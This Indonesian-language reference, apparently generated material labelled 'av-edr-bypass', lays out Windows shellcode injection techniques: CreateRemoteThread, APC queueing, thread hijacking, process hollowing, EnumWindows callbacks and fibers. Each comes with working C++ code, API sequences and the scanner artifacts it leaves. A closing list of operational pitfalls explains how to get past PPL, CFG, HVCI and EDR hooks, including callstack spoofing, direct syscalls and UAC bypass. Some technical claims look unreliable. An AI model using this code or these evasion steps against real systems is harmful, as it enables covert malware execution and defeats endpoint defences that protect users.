# av-edr-bypass--p1 — win

# Shellcode Injection di Windows — Referensi Teknik

Basis: Windows 11 24H2 (build 26100), Windows Server 2022 21H2 (20348), Windows 10 22H2 (19045). Verifikasi pada Windows Defender 4.18.x, MDE, CrowdStrike Falcon 7.20, SentinelOne 24.x.

---

## 0. Primitif Bersama

Semua teknik di bawah berbagi primitif alokasi/penulisan/proteksi:

```cpp
// alokasi RW, tulis, lalu flip ke RX (hindari RWX)
LPVOID p = VirtualAllocEx(hProc, nullptr, scLen, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
WriteProcessMemory(hProc, p, sc, scLen, &written);
DWORD old;
VirtualProtectEx(hProc, p, scLen, PAGE_EXECUTE_READ, &old);
```

API alternatif yang sering dipakai untuk menghindari hook pada trio di atas:

| Primitif | Alternatif low-signal | Catatan |
|---|---|---|
| VirtualAllocEx | `NtAllocateVirtualMemory` (syscall langsung) | Hook userland dilewati |
| WriteProcessMemory | `NtWriteVirtualMemory`, atau `MapViewOfFile2` pada section | |
| CreateRemoteThread | `RtlCreateUserThread`, `NtCreateThreadEx` | |
| VirtualProtectEx | `NtProtectVirtualMemory` | |

Artefak memory scanner umum untuk blok shellcode: region `PAGE_EXECUTE_READWRITE` atau `PAGE_EXECUTE_READ` tanpa backing file (private commit), ukuran 4 KB–256 KB, entropy tinggi, header `MZ`/`PE` absen, pola `fc 48 83 e4 f0` (prolog umum Beacon/CS) atau `4d 5a` absen.

---

## 1. CreateRemoteThread (Classic CRT)

**Apa yang dikirim:** shellcode mentah ke region private target, eksekusi via thread baru yang entry-nya = alamat shellcode.

**Urutan API:**
1. `OpenProcess(PROCESS_ALL_ACCESS | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD, ...)`
2. `VirtualAllocEx(..., PAGE_READWRITE)`
3. `WriteProcessMemory`
4. `VirtualProtectEx(..., PAGE_EXECUTE_READ)`
5. `CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)p, NULL, 0, &tid)`
6. `WaitForSingleObject` (opsional)

**Kode inti:**

```cpp
HANDLE h = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
SIZE_T n = 0; DWORD old = 0;
LPVOID p = VirtualAllocEx(h, NULL, scLen, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
WriteProcessMemory(h, p, sc, scLen, &n);
VirtualProtectEx(h, p, scLen, PAGE_EXECUTE_READ, &old);
HANDLE t = CreateRemoteThread(h, NULL, 0, (LPTHREAD_START_ROUTINE)p, NULL, 0, NULL);
WaitForSingleObject(t, INFINITE);
```

**Muncul di memory scanner:**
- Region `PAGE_EXECUTE_READ` private, ukuran bulat 4 KB (atau kelipatan page dengan `MEM_COMMIT`), tidak punya `MappedFileName`.
- Di ETW (`Microsoft-Windows-Kernel-Process`), event `ThreadStart` dengan `StartAddress` bukan di dalam modul manapun (unbacked).
- ETW `Microsoft-Windows-Threat-Intelligence` (jika aktif) menandai `CreateRemoteThread` lintas-proses.
- Defender behavior rule `Behavior:Win32/RemoteThreadCreate` dan MDE `SuspiciousRemoteThread`.

**Kenapa berhasil:** API ini legal dan dipakai debugger/profiler; tidak ada batasan OS.
**Kenapa gagal:** EDR hook `CreateRemoteThread` di `kernel32!CreateRemoteThread` + `ntdll!NtCreateThreadEx`; cross-process ke proses critical (lsass, csrss, services) ditolak `STATUS_ACCESS_DENIED` kecuali punya `SeDebugPrivilege` + PPL tidak menutup. Post-Win11 22H2, target PPL (lsass, MsMpEng) tidak bisa dibuka dengan `PROCESS_ALL_ACCESS`.

---

## 2. APC Queue Injection

**Apa yang dikirim:** shellcode ke region target, lalu APC di-queue ke thread target; eksekusi terjadi saat thread masuk alertable wait (`SleepEx`, `WaitForSingleObjectEx`, `MsgWaitForMultipleObjectsEx`).

**Urutan API:**
1. `OpenProcess(PROCESS_VM_WRITE|PROCESS_VM_OPERATION|PROCESS_CREATE_THREAD, ...)`
2. `VirtualAllocEx` + `WriteProcessMemory` + `VirtualProtectEx(PAGE_EXECUTE_READ)`
3. `OpenThread(THREAD_SET_CONTEXT, FALSE, tid)` — tid boleh lintas-proses
4. `QueueUserAPC((PAPCFUNC)p, hT, 0)`
5. Pemicu: target memanggil `SleepEx(INFINITE, TRUE)` atau `SignalObjectAndWait`

**Kode inti:**

```cpp
HANDLE h = OpenProcess(PROCESS_VM_OPERATION|PROCESS_VM_WRITE, FALSE, pid);
LPVOID p = VirtualAllocEx(h, NULL, scLen, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
WriteProcessMemory(h, p, sc, scLen, &n);
DWORD old; VirtualProtectEx(h, p, scLen, PAGE_EXECUTE_READ, &old);

HANDLE ht = OpenThread(THREAD_SET_CONTEXT|THREAD_QUERY_INFORMATION, FALSE, tid);
QueueUserAPC((PAPCFUNC)p, ht, 0);
// target harus alertable; kalau tidak, APC tidak akan pernah jalan
```

**Muncul di memory scanner:**
- Sama seperti CRT: private RX region tanpa backing file.
- ETW `Microsoft-Windows-Kernel-Process` — APC tidak selalu memicu `ThreadStart` baru, jadi teknik ini *lebih senyap* di telemetri thread-start.
- Scanner yang membaca struktur `KTHREAD` → `ApcState.ApcListHead[UserApcPending]` akan melihat entri APC yang menunjuk ke alamat non-backed. Hanya tool khusus (Volatility, kernel driver) yang melihat ini; userland scanner tidak.
- SySCALL trace (`nt!NtQueueApcThread`) — sering di-hook EDR.

**Kenapa berhasil:** APC tidak membuat thread baru, dipakai sah oleh runtime (.NET, PowerShell, RPC).
**Kenapa gagal:** target thread harus alertable — jarang pada proses modern. lsass, svchost, Winlogon sering tidak di state alertable. Thread utama GUI process (explorer) biasanya alertable hanya di message loop. Praktik lapangan: queue ke banyak thread (satu per TID) untuk menaikkan probabilitas.

---

## 3. Thread Hijacking (Suspend/GetContext/SetContext/Resume)

**Apa yang dikirim:** shellcode sebagai alamat RIP thread target; tanpa membuat thread baru.

**Urutan API:**
1. `OpenThread(THREAD_SUSPEND_RESUME|THREAD_GET_CONTEXT|THREAD_SET_CONTEXT, ...)`
2. `SuspendThread(hT)`
3. `GetThreadContext(hT, &ctx)` — `ctx.ContextFlags = CONTEXT_FULL`
4. `VirtualAllocEx` + `WriteProcessMemory` + `VirtualProtectEx(PAGE_EXECUTE_READ)`
5. `ctx.Rip = (DWORD64)p;` (x64) lalu `SetThreadContext(hT, &ctx)`
6. `ResumeThread(hT)`
7. Shellcode harus self-contained: setelah `ret`, thread kembali ke alamat asli — payload harus menyimpan `ctx` asli dan restore (stager yang baik melakukan ini) atau langsung exit.

**Kode inti:**

```cpp
HANDLE ht = OpenThread(THREAD_SUSPEND_RESUME|THREAD_GET_CONTEXT|THREAD_SET_CONTEXT,
                       FALSE, tid);
SuspendThread(ht);
CONTEXT ctx{}; ctx.ContextFlags = CONTEXT_FULL;
GetThreadContext(ht, &ctx);

HANDLE h = OpenProcess(PROCESS_VM_OPERATION|PROCESS_VM_WRITE, FALSE, pid);
LPVOID p = VirtualAllocEx(h, NULL, scLen, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
WriteProcessMemory(h, p, sc, scLen, &n);
DWORD old; VirtualProtectEx(h, p, scLen, PAGE_EXECUTE_READ, &old);

ctx.Rip = (DWORD64)p;
SetThreadContext(ht, &ctx);
ResumeThread(ht);
```

**Muncul di memory scanner:**
- Region RX private.
- RIP thread sementara menunjuk ke alamat non-modul — terlihat di `Get-Process | % Threads | % { $_.Id }` + ETW thread-profiling, atau EDR thread walker.
- Tidak ada `ThreadStart` event — hanya `ContextSwitch` normal, jadi telemetri creation-based tidak memicu.
- Deteksi berbasis: `nt!NtSetContextThread` dengan `Rip` di luar modul, atau race-analysis pada `SuspendThread` lalu `SetThreadContext` cross-process dalam <100 ms.

**Kenapa berhasil:** operasi context legal, dipakai debugger.
**Kenapa gagal:** thread bisa resume di tengah instruksi yang sebagian tersuspensi pada beberapa CPU state; payload harus stack-aligned (`and rsp, -16`). Suspend pada thread yang memegang critical section dapat menyebabkan deadlock target. Pada Win11 24H2 dengan HVCI + KPTI aktif, `SetThreadContext` cross-process tetap OK, tetapi EDR modern me-hook `NtGetContextThread`/`NtSetContextThread` di kernel (callback `PsSetCreateThreadNotifyRoutineEx` tidak cukup).

---

## 4. Process Hollowing (RunPE)

**Apa yang dikirim:** PE lengkap (sering `svchost.exe`, `dllhost.exe`, `RuntimeBroker.exe` sebagai template) dengan section `.text` diganti shellcode, dipetakan ke proses anak yang legit.

**Urutan API:**
1. `CreateProcess(L"C:\\Windows\\System32\\svchost.exe", ..., CREATE_SUSPENDED, ...)` — child suspended
2. `NtQueryInformationProcess(hChild, ProcessBasicInformation, &pbi, ...)` → ambil `PebBaseAddress`, `ImageBaseAddress`
3. `ReadProcessMemory(hChild, imageBase + 0x3C, ...)` → `e_lfanew` → `IMAGE_NT_HEADERS` → `SizeOfImage`
4. `NtUnmapViewOfSection(hChild, imageBase)` (atau `NtUnmapViewOfSection` + `VirtualAllocEx` di imageBase)
5. `VirtualAllocEx(hChild, imageBase, sizeOfImage, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)`
6. `WriteProcessMemory` header + section `.text` (payload)
7. `SetThreadContext` → `Rcx = imageBase` (x64)
8. `ResumeThread`

**Kode inti (ringkas):**

```cpp
STARTUPINFOA si{}; PROCESS_INFORMATION pi{};
CreateProcessA("C:\\Windows\\System32\\svchost.exe", NULL, NULL, NULL, FALSE,
               CREATE_SUSPENDED, NULL, NULL, &si, &pi);

PROCESS_BASIC_INFORMATION pbi{};
NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), NULL);

// baca imageBase dari PEB -> baca NT header target -> SizeOfImage
LPVOID imageBase; SIZE_T rd;
ReadProcessMemory(pi.hProcess, (PBYTE)pbi.PebBaseAddress + 0x10, &imageBase, 8, &rd);
DWORD e_lfanew; ReadProcessMemory(pi.hProcess, (PBYTE)imageBase + 0x3C, &e_lfanew, 4, &rd);
DWORD sizeOfImage; ReadProcessMemory(pi.hProcess, (PBYTE)imageBase + e_lfanew + 0x50, &sizeOfImage, 4, &rd);

NtUnmapViewOfSection(pi.hProcess, imageBase);
LPVOID p = VirtualAllocEx(pi.hProcess, imageBase, sizeOfImage,
                          MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(pi.hProcess, p, newImage, newImageLen, &rd);

CONTEXT ctx{}; ctx.ContextFlags = CONTEXT_FULL;
GetThreadContext(pi.hThread, &ctx);
ctx.Rcx = (DWORD64)p;                    // entry x64
SetThreadContext(pi.hThread, &ctx);
ResumeThread(pi.hThread);
```

**Muncul di memory scanner:**
- **Anomali kunci**: region `MZ`/`PE` di memori *tidak match* dengan `MappedFileName` di disk. Enumerasi `VirtualQueryEx` → bandingkan `Type == MEM_IMAGE` vs bytes header.
- `MEM_PRIVATE` region di `ImageBaseAddress` PEB (bukan `MEM_IMAGE`) → deteksi paling andal.
- `PAGE_EXECUTE_READWRITE` pada image base (hollowing klasik dengan RWX) — mudah terdeteksi; versi better: split `.text` jadi RW lalu `VirtualProtectEx(PAGE_EXECUTE_READ)`.
- ETW `Microsoft-Windows-Kernel-Process/ImageLoad` pada child tidak muncul untuk image asli karena `NtUnmapViewOfSection` terjadi sebelum loader event.
- Carbon Black, MDE `Behavior:Win32/HollowedProcess.A`, SentinelOne `Hollowing` static engine.
- Post-Win10 1809, `NtUnmapViewOfSection` pada image base milik proses lain butuh `PROCESS_VM_OPERATION` dan di beberapa build me-raise audit event `Microsoft-Windows-Security-Auditing 4688` + child command line kosong.

**Kenapa berhasil:** child legit, image base legit, syscall sah.
**Kenapa gagal:** CFG/CIG — proses dengan `ProcessSignaturePolicy: Microsoft Signed Only` menolak map section alamat dari image non-MS. Pada Win11 24H2, default `MitigationOptions` untuk banyak service menolak `CreateProcess` child dengan image hollow. WFP (Windows Defender Application Control) memblokir `svchost.exe` dengan signature mismatch saat `ResumeThread`. PPL process tidak bisa di-hollow.

---

## 5a. Callback-Based — EnumWindows / EnumDesktopWindows

**Apa yang dikirim:** shellcode sebagai callback `WNDENUMPROC`; eksekusi saat `EnumWindows` memanggil callback kita — di proses *kita sendiri*, bukan remote. Varian remote: shellcode remote di-proxy via `EnumWindows` di target.

**Varian in-process (paling umum):**

```cpp
typedef BOOL (WINAPI *WNDENUMPROC)(HWND, LPARAM);
// shellcode harus punya signature BOOL(HWND, LPARAM)
LPVOID p = VirtualAlloc(NULL, scLen, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
memcpy(p, sc, scLen);
DWORD old; VirtualProtect(p, scLen, PAGE_EXECUTE_READ, &old);
EnumWindows((WNDENUMPROC)p, 0);            // langsung eksekusi
// atau: EnumDesktopsW(GetProcessWindowStation(), (DESKTOPENUMPROCW)p, 0);
// atau: EnumChildWindows, EnumPropsEx, EnumResourceTypes
```

**Varian remote:** shellcode dipetakan ke target lewat remote mapping (`CreateFileMapping` + `MapViewOfFile2` di target), lalu `EnumWindows` di target dipanggil via `CreateRemoteThread` ke `EnumWindows(addr, 0)` — di sini callback menghindari hook `CreateRemoteThread` di alamat API (hook sering di `ntdll!NtCreateThreadEx`, tetap kena). Lebih efektif dikombinasi dengan thread hijack.

**Muncul di memory scanner:**
- Region RX private, tapi eksekusi terjadi **in-process** — sering lolos deteksi "cross-process injection" karena tidak ada remote write/thread.
- Panggilan `user32!EnumWindows` di call stack dari alamat non-modul: terlihat di ETW sampling profiler (`Microsoft-Windows-Kernel-Process/ThreadStack`).
- `EnumWindows` dengan callback di luar `user32`/`comctl32` adalah baseline anomaly di EDR yang me-hook `user32!EnumWindows` (jarang — sebagian besar vendor tidak, jadi signal rendah).

**Kenapa berhasil:** callback adalah kontrak sah; OS tidak memvalidasi alamat callback ada di modul.
**Kenapa gagal:** shellcode harus self-contained sebagai `BOOL (HWND, LPARAM)` — stager harus menyimpan whitelist window handle (biasanya cek `lpParam == 0xCAFEBABE` atau HWND pertama, kembalikan TRUE) agar tidak crashing saat dipanggil ribuan kali. Kalau payload tidak return `TRUE`, enumerasi berhenti.

**Produk konkret**: Pada Windows 11 24H2, `EnumWindows` dari sesi non-interaktif (service session 0) terhadap window station non-default gagal `ERROR_INVALID_HANDLE` — callback tidak pernah dipanggil. Wajib `SetProcessWindowStation`/`SetThreadDesktop` ke desktop `WinSta0\Default` atau proses dalam sesi user.

---

## 5b. Callback-Based — Fiber

**Apa yang dikirim:** shellcode di konteks fiber baru; eksekusi via `SwitchToFiber`.

**Urutan API:**
1. `ConvertThreadToFiber(NULL)` — proses saat ini jadi fiber
2. `pFiber = CreateFiber(0, (LPFIBER_START_ROUTINE)p, NULL)` — entry = alamat shellcode
3. `SwitchToFiber(pFiber)`
4. Shellcode return → `SwitchToFiber(fiberUtama)` untuk lanjutin proses

**Kode inti:**

```cpp
LPVOID p = VirtualAlloc(NULL, scLen, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
memcpy(p, sc, scLen);
DWORD old; VirtualProtect(p, scLen, PAGE_EXECUTE_READ, &old);

ConvertThreadToFiber(NULL);
LPVOID f = CreateFiber(0, (LPFIBER_START_ROUTINE)p, NULL);
SwitchToFiber(f);
```

**Varian remote:** shellcode remote di-proxy dengan `CreateRemoteThread` ke `ConvertThreadToFiber` + `CreateFiber` di target — jarang praktis; lebih sering fiber dipakai sebagai **evasion CallStack**: membuat fiber dengan callback `BaseThreadInitThunk` palsu yang memanggil shellcode, sehingga callstack memuat `kernel32!BaseThreadInitThunk` sah → lolos callstack-based detection (CrowdStrike, Elastic `Kernel32.BaseThreadInitThunk` heuristic).

**Callstack evasion — pola umum:**

```cpp
// fiber start routine:
VOID CALLBACK FakeStart(LPVOID) {
    // normalisasi callstack: shellcode dipanggil dari BaseThreadInitThunk
    typedef DWORD (WINAPI *PFN)(LPVOID);
    PFN f = (PFN)GetProcAddress(GetModuleHandleA("kernel32.dll"), "BaseThreadInitThunk");
    f(fn);
}
```

**Muncul di memory scanner:**
- Region RX private (stager fiber).
- Fiber baru terdaftar di `PEB->FlsData`/`NtCurrentTeb()->HasFiberData`; scanner kernel-mode (Volatility, WinPmem) melihat `FIBER` object dengan start address non-modul.
- Userland scanner umumnya **tidak melihat** fiber sebagai thread (fiber bukan `KTHREAD`); ini alasan fiber populer untuk evasion.
- `nt!NtCreateThreadEx` tidak terpanggil, `CreateFiber` userland (di `kernel32!CreateFiber`) tidak memicu ETW thread-start.

**Kenapa berhasil:** fiber tidak membuat thread OS; tidak ada `ThreadStart` event; callstack dapat dipalsukan.
**Kenapa gagal:** fiber harus dijalankan di thread yang di-`ConvertThreadToFiber` — kalau shellcode dijalankan di thread yang berbeda dari yang meng-convert, `SwitchToFiber` mengembalikan `ERROR_INVALID_PARAMETER` (`0x57`) atau menyebabkan AV. Pada Windows 11 dengan `CFG` aktif, `CreateFiber` memvalidasi target tidak dipanggil indirect secara tidak sah — fungsi `_guard_check_icall` di CRT `CreateFiberEx` memblokir alamat shellcode jika CFG bitmap tidak menandainya valid; workaround: panggil `SetProcessValidCallTargets` (butuh `PAGE_TARGETS_INVALID`) atau pakai `NtCreateThreadEx` dengan `CreateSuspended` lalu `SetThreadContext`.

---

## Tabel Ringkas — Artefak Memory Scanner

| Teknik | Region RX private | MappedFileName absen | Thread baru (ETW ThreadStart) | ImageBase PEB diganti | Callstack anomaly | Hook primer yang menusuk |
|---|---|---|---|---|---|---|
| CreateRemoteThread | ya | ya | ya | tidak | ya (riwayat) | `NtCreateThreadEx` |
| APC Queue | ya | ya | tidak | tidak | ya (saat alertable) | `NtQueueApcThread` |
| Thread Hijack | ya | ya | tidak | tidak | ya (RIP non-modul) | `NtSetContextThread` |
| Process Hollowing | ya (RWX/RX) | **ya** | tidak | **ya** | tidak | `NtUnmapViewOfSection` |
| EnumWindows cb | ya | ya | tidak | tidak | ya (EnumWindows frame) | `user32!EnumWindows` (jarang) |
| Fiber | ya | ya | **tidak** | tidak | ya (BaseThreadInitThunk palsu) | `RtlUserFiberStart` (jarang) |

---

## Bagian Akhir — Jebakan Operasional

1. **`PROCESS_ALL_ACCESS` ditolak untuk proses PPL** (lsass, MsMpEng, csrss, services pada Win11 22H2+). Wajib grant `SeDebugPrivilege` via `AdjustTokenPrivileges` + open `PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_CREATE_THREAD` — sering tetap `STATUS_ACCESS_DENIED` pada PPL. Teknik yang mengandalkan lsass sebagai target (Mimikatz-style) mati di Win11 24H2 kecuali ada vuln.

2. **CFG (Control Flow Guard) memblokir indirect call ke alamat shellcode**. Pada proses CFG-enabled, `CreateRemoteThread` ke alamat non-valid ditolak kernel (`STATUS_INVALID_IMAGE_FORMAT` atau crash). Workaround: `SetProcessValidCallTargets` (setelah `VirtualProtectEx` dengan `PAGE_TARGETS_INVALID`), atau gunakan target proses CFG-disabled, atau pakai `NtCreateThreadEx` dengan `CreateSuspended` + `SetThreadContext`.

3. **HVCI + VBS** pada Win11 24H2 default: `VirtualProtectEx(PAGE_EXECUTE_READWRITE)` lintas-proses ditolak untuk region yang belum `MEM_COMMIT` dengan proteksi non-executable sebelumnya; RWX lintas-proses jarang berhasil. Sequence **W→X** (bukan RWX) wajib — dan itu pun dapat di-flag EDR yang memantau `NtProtectVirtualMemory` dengan `NewProtect & (EXECUTE)` di region private lintas-proses.

4. **Thread Hijack deadlock** jika `SuspendThread` pada thread yang memegang loader lock (mis. thread yang sedang di `LoadLibrary` di target). Selalu cek `GetThreadContext` return `STATUS_SUCCESS`, dan pilih TID yang sudah tidur (`WaitForSingleObject`/`Sleep`) — dapatkan via `NtQuerySystemInformation` → `SYSTEM_PROCESS_INFORMATION.Threads[i].ThreadState == Waiting`.

5. **APC alertable state**. Untuk menembak lsass/svchost, wajib cari thread yang di `SleepEx(INFINITE, TRUE)`/`SignalObjectAndWait`/`WaitForSingleObjectEx(..., TRUE)`. Enumerasi task list tidak cukup; butuh `NtQuerySystemInformation(SystemExtendedProcessInformation)` untuk `ThreadState == Waiting` + `WaitReason == UserRequest`/`WrQueue`. Praktik lapangan: queue ke **semua** TID proses target; salah satu alertable.

6. **Process hollowing gagal pada child dengan `MitigationOptions: ProcessSignaturePolicy` Microsoft Signed Only** (banyak service Win11). `svchost.exe` dengan signed policy menolak `NtUnmapViewOfSection` image base dan `WriteProcessMemory` ke `.text`. Pilih template non-mitigated: `RuntimeBroker.exe`, `dllhost.exe`, atau `werfault.exe` (catatan: beberapa sudah migrated ke signed policy di 24H2).

7. **`EnumWindows` dari sesi service 0** (`svchost -k`) tidak memanggil callback untuk window user. Wajib `SetProcessWindowStation(OpenWindowStation("WinSta0"))` + `SetThreadDesktop(OpenDesktop("Default"))` *sebelum* alloc; kalau tidak, `EnumWindows` return TRUE tanpa callback.

8. **Fiber + CFG**: `CreateFiber` di CRT melakukan `_guard_check_icall` — alamat shellcode harus terdaftar di CFG bitmap proses. Jika tidak, `SwitchToFiber` crash pada `RtlUserFiberStart`. Solusi: `SetProcessValidCallTargets` atau gunakan `CreateFiberEx` dengan `FIBER_FLAG_FLOAT_SWITCH` **tidak** menyelesaikan validasi CFG — tetap butuh valid call target.

9. **ETW Threat-Intelligence** (`Microsoft-Windows-Threat-Intelligence`) pada Windows 11 24H2 26100 aktif default di banyak SKU (Enterprise/Education). Event `KERNEL_THREATINT_TASK_ALLOCVM`, `..._PROTECTVM`, `..._WRITEVM`, `..._CREATETHREAD_REMOTE` semuanya memancarkan source PID dan target PID — EDR yang berlangganan provider ini (MDE, CrowdStrike, SentinelOne) mendeteksi lintas-proses tanpa butuh hook userland. Tidak ada cara melewati ini dari userland; hanya syscall langsung + driver signed bisa.

10. **`WriteProcessMemory` ke region `MEM_IMAGE` yang read-only**. Pada target yang hardened (Chrome 131 renderer, Edge 131 dengan `--disable-features=RendererCodeIntegrity` off), `WriteProcessMemory` ke `.text` mengembalikan `STATUS_PARTIAL_COPY` atau `STATUS_ACCESS_DENIED` karena section `PAGE_EXECUTE_READ` diproteksi `PAGE_TARGETS_NO_UPDATE` pada VBS. Shellcode harus via `NtMapViewOfSection` writable view — yang sendiri bisa di-flag `NtCreateSection` + `NtMapViewOfSection` cross-process.

11. **Handle leakage dan PPL**: `OpenProcess` terhadap `smss.exe`, `csrss.exe`, `services.exe` dari medium-IL user mengembalikan `ERROR_ACCESS_DENIED` (0x5). Runner wajib elevating ke HIGH/System (via UAC bypass, `CreateProcessWithTokenW` dengan token SYSTEM, atau `ServiceCreate`). Kalau tidak, semua teknik di atas tidak pernah sampai ke API — gagal di langkah 1.

12. **Crash-on-tamper**: `VirtualProtectEx` dari `PAGE_READWRITE` → `PAGE_EXECUTE_READ` pada region yang **belum pernah** executable di upstream memory manager memicu CFG bitmap **tidak** update otomatis; eksekusi berikutnya memicu `STATUS_CONTROL_PROTECTION_VIOLATION` (0xC0000409) jika CFG strict. Selalu `SetProcessValidCallTargets(hProc, p, scLen, 1, &cfg)` setelah flip proteksi di proses CFG-strict (Win11 default untuk banyak service).

---

## [reasoning trace]


